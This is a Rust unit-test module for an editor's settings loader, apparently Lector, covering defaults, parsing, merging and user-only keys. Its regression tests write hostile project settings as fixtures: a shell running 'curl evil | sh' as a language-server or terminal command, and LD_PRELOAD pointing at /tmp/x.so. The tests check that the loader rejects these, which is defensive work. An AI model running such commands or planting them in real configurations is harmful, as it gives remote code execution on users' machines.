    fn auto_fetch_is_off_by_default_parses_minutes_and_is_user_only() {
        assert_eq!(Settings::default().git.auto_fetch, AutoFetch::Off);
        let parse = |v: &str| {
            let text = format!("[git]\nauto_fetch = {v}\n");
            let table: toml::Table = toml::from_str(&text).unwrap();
            Settings::deserialize(table).map(|s| s.git.auto_fetch)
        };
        assert_eq!(parse("\"off\"").unwrap(), AutoFetch::Off);
        assert_eq!(parse("15").unwrap(), AutoFetch::Minutes(15));
        assert_eq!(parse("\"10\"").unwrap(), AutoFetch::Minutes(10));
        assert_eq!(parse("0").unwrap(), AutoFetch::Off);
        assert!(parse("\"often\"").is_err());
        assert_eq!(
            AutoFetch::Minutes(15).interval(),
            Some(std::time::Duration::from_secs(900))
        );
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(&user, "[git]\nauto_fetch = 5\n").unwrap();
        let project = dir.path().join("p");
        std::fs::create_dir_all(project.join(".lector")).unwrap();
        std::fs::write(
            project.join(".lector").join("settings.toml"),
            "[git]\nauto_fetch = 1\nblame_gutter = true\n",
        )
        .unwrap();
        let (s, warnings) = load_settings_from(&user, Some(&project));
        assert_eq!(
            s.git.auto_fetch,
            AutoFetch::Minutes(5),
            "project cannot change it"
        );
        assert!(s.git.blame_gutter);
        assert!(warnings.iter().any(|w| w.contains("git.auto_fetch")));
    }

    #[test]
    fn updates_settings_are_off_by_default_and_user_only() {
        let d = Settings::default().updates;
        assert_eq!(d.check, crate::UpdateCheck::Off);
        assert_eq!(d.channel, crate::UpdateChannel::Stable);
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(&user, "[updates]\nchannel = \"preview\"\n").unwrap();
        let project = dir.path().join("p");
        std::fs::create_dir_all(project.join(".lector")).unwrap();
        std::fs::write(
            project.join(".lector/settings.toml"),
            "[updates]\ncheck = \"on\"\n",
        )
        .unwrap();
        let (s, w) = load_settings_from(&user, Some(&project));
        assert_eq!(
            s.updates.check,
            crate::UpdateCheck::Off,
            "a project cannot opt you in"
        );
        assert_eq!(s.updates.channel, crate::UpdateChannel::Preview);
        assert!(
            w.iter().any(|w| w.contains("[updates] is ignored")),
            "{w:?}"
        );
    }

    /// Regression: a project's `.lector/settings.toml` could replace a language server's
    /// command (run on open) or add agent commands.
    #[test]
    fn project_settings_cannot_define_commands() {
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(
            &user,
            "[lsp.servers.gopls]\ncommand = \"my-gopls\"\n[[agent.servers]]\nname = \"Mine\"\ncommand = \"mine\"\n",
        )
        .unwrap();
        let project = dir.path().join("p");
        std::fs::create_dir_all(project.join(".lector")).unwrap();
        std::fs::write(
            project.join(".lector/settings.toml"),
            "[lsp.servers.rust-analyzer]\ncommand = \"sh\"\nargs = [\"-c\", \"curl evil | sh\"]\n\
             [lsp.servers.gopls]\nargs = [\"x\"]\nenabled = false\n\
             [lsp.servers.jdtls]\nenabled = true\n\
             [[agent.servers]]\nname = \"Evil\"\ncommand = \"sh\"\n\
             [agent]\ncheckpoints = false\n",
        )
        .unwrap();
        let (s, w) = load_settings_from(&user, Some(&project));
        assert!(
            !s.lsp.servers.contains_key("rust-analyzer")
                || s.lsp.servers["rust-analyzer"].command.is_none()
        );
        assert_eq!(s.lsp.servers["gopls"].command.as_deref(), Some("my-gopls"));
        assert_eq!(s.lsp.servers["gopls"].args, None);
        assert_eq!(
            s.lsp.servers["gopls"].enabled,
            Some(false),
            "disabling stays allowed"
        );
        assert_eq!(s.lsp.servers.get("jdtls").and_then(|o| o.enabled), None);
        assert_eq!(s.agent.servers.len(), 1);
        assert_eq!(s.agent.servers[0].name, "Mine");
        assert!(!s.agent.checkpoints, "other project settings still apply");
        assert!(
            w.iter()
                .any(|w| w.contains("lsp.servers.rust-analyzer.command")),
            "{w:?}"
        );
        assert!(w.iter().any(|w| w.contains("agent.servers")), "{w:?}");
    }

    #[test]
    fn completion_and_signature_help_settings() {
        let d = Settings::default().editor;
        assert!(d.completion.enabled && !d.completion.snippets && d.signature_help.enabled);
        assert_eq!(d.completion.insert_mode, CompletionInsertMode::Insert);
        assert!(d.completion.accept_on_enter);
        let s: Settings = toml::from_str(
            "[editor.completion]\nsnippets = true\ninsert_mode = \"replace\"\n\
             [editor.signature_help]\nenabled = false\n",
        )
        .unwrap();
        assert!(
            s.editor.completion.enabled,
            "unset keys keep their defaults"
        );
        assert!(s.editor.completion.snippets && !s.editor.signature_help.enabled);
        assert_eq!(
            s.editor.completion.insert_mode,
            CompletionInsertMode::Replace
        );
        assert!(
            toml::from_str::<Settings>("[editor.completion]\ninsert_mode = \"sideways\"\n")
                .is_err()
        );
    }

    #[test]
    fn terminal_settings_parse_and_shell_is_user_only() {
        let d = Settings::default().terminal;
        assert_eq!(d.scrollback, 10_000);
        assert!(d.shell_integration && d.restore && d.confirm_multiline_paste);
        assert!(!d.copy_on_select && !d.option_as_meta && !d.ctrl_c_copies_selection);
        assert_eq!(d.new_terminal_cwd, crate::NewTerminalCwd::Project);
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(
            &user,
            "[terminal]\nshell = { program = \"/bin/zsh\", args = [\"-l\"] }\n\
             cursor_style = \"beam\"\nnew_terminal_cwd = \"active_file\"\n\
             [[terminal.profiles]]\nname = \"fish\"\nprogram = \"fish\"\n\
             [terminal.env]\nA = \"1\"\n",
        )
        .unwrap();
        let project = dir.path().join("p");
        std::fs::create_dir_all(project.join(".lector")).unwrap();
        std::fs::write(
            project.join(".lector/settings.toml"),
            "[terminal]\nshell = { program = \"sh\", args = [\"-c\", \"curl evil | sh\"] }\n\
             default_profile = \"evil\"\nscrollback = 50000000\n\
             confirm_multiline_paste = false\ncopy_on_select = true\n\
             [[terminal.profiles]]\nname = \"evil\"\nprogram = \"sh\"\n\
             [terminal.env]\nLD_PRELOAD = \"/tmp/x.so\"\n",
        )
        .unwrap();
        let (s, w) = load_settings_from(&user, Some(&project));
        let t = &s.terminal;
        assert_eq!(
            t.shell.as_ref().map(|s| s.program.as_str()),
            Some("/bin/zsh")
        );
        assert_eq!(t.profiles.len(), 1);
        assert_eq!(t.profiles[0].name, "fish");
        assert_eq!(t.default_profile, None);
        assert_eq!(t.env.get("A").map(String::as_str), Some("1"));
        assert!(!t.env.contains_key("LD_PRELOAD"));
        assert_eq!(t.scrollback, 10_000, "scrollback is user-only");
        assert!(t.confirm_multiline_paste, "the paste prompt is user-only");
        assert!(
            t.copy_on_select,
            "harmless keys still apply from the project"
        );
        assert_eq!(t.cursor_style, crate::TerminalCursorStyle::Beam);
        assert_eq!(t.new_terminal_cwd, crate::NewTerminalCwd::ActiveFile);
        for key in [
            "terminal.shell",
            "terminal.profiles",
            "terminal.env",
            "terminal.default_profile",
            "terminal.confirm_multiline_paste",
            "terminal.scrollback",
        ] {
            assert!(w.iter().any(|w| w.contains(key)), "{key}: {w:?}");
        }
    }

    #[test]
    fn default_toml_parses_to_defaults() {
        let s: Settings = toml::from_str(default_settings_toml()).unwrap();
        assert_eq!(s, Settings::default());
        let mut w = Vec::new();
        assert!(parse_layer("d", default_settings_toml(), &mut w).is_some());
        assert!(w.is_empty(), "{w:?}");
    }

    #[test]
    fn review_settings_defaults_and_overrides() {
        let d = Settings::default().review;
        assert!(d.risk_order && d.detect_moved && !d.structural);
        let mut w = Vec::new();
        let table = parse_layer(
            "t",
            "[review]\nrisk_order = false\nstructural = true\n",
            &mut w,
        )
        .unwrap();
        assert!(w.is_empty(), "{w:?}");
        let s = Settings::deserialize(table).unwrap();
        assert!(!s.review.risk_order);
        assert!(s.review.detect_moved, "unset keys keep their default");
        assert!(s.review.structural);
    }

    #[test]
    fn agent_servers_parse() {
        let text = "[agent]\ncheckpoints = false\n[[agent.servers]]\nname = \"Fake\"\ncommand = \"python3\"\nargs = [\"agent.py\"]\nenv = { A = \"1\" }\n";
        let mut w = Vec::new();
        let table = parse_layer("t", text, &mut w).unwrap();
        assert!(w.is_empty(), "{w:?}");
        let s = Settings::deserialize(table).unwrap();
        assert!(!s.agent.checkpoints);
        assert!(s.agent.auto_allow_reads);
        assert_eq!(s.agent.servers.len(), 1);
        assert_eq!(s.agent.servers[0].args, vec!["agent.py".to_string()]);
        assert_eq!(
            s.agent.servers[0].env.get("A").map(String::as_str),
            Some("1")
        );
    }

    #[test]
    fn merge_and_warnings() {
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(
            &user,
            "tab_size = 2\nbogus = 1\n[diff]\ncontext_lines = 5\nlayout = \"split\"\n",
        )
        .unwrap();
        let proj = dir.path().join("proj");
        std::fs::create_dir_all(proj.join(".lector")).unwrap();
        std::fs::write(
            proj.join(".lector/settings.toml"),
            "buffer_font_family = \"Fira Code\"\n[diff]\ncontext_lines = 9\n[diff.nope]\nx=1\n",
        )
        .unwrap();
        let (s, w) = load_settings_from(&user, Some(&proj));
        assert_eq!(s.tab_size, 2);
        assert_eq!(s.diff.context_lines, 9);
        assert_eq!(s.diff.layout, DiffLayout::Split);
        assert!(s.diff.word_diff);
        assert_eq!(s.buffer_font_family, vec!["Fira Code"]);
        assert!(w.iter().any(|m| m.contains("bogus")), "{w:?}");
        assert!(w.iter().any(|m| m.contains("nope")), "{w:?}");
    }

    #[test]
    fn broken_files_do_not_fail() {
        let dir = tempfile::tempdir().unwrap();
        let user = dir.path().join("settings.toml");
        std::fs::write(&user, "tab_size = [").unwrap();
        let (s, w) = load_settings_from(&user, None);
        assert_eq!(s, Settings::default());
        assert_eq!(w.len(), 1);
        std::fs::write(&user, "tab_size = \"x\"\n").unwrap();
        let (s, w) = load_settings_from(&user, None);
        assert_eq!(s, Settings::default());
        assert_eq!(w.len(), 1);
        let (s, w) = load_settings_from(&dir.path().join("missing.toml"), None);
        assert_eq!(s, Settings::default());
        assert!(w.is_empty());
    }

    #[test]
    fn server_overrides() {
        let s: Settings =
            toml::from_str("[lsp.servers.gopls]\nenabled = false\ncommand = \"x\"\n").unwrap();
        assert_eq!(s.lsp.servers["gopls"].enabled, Some(false));
    }
}
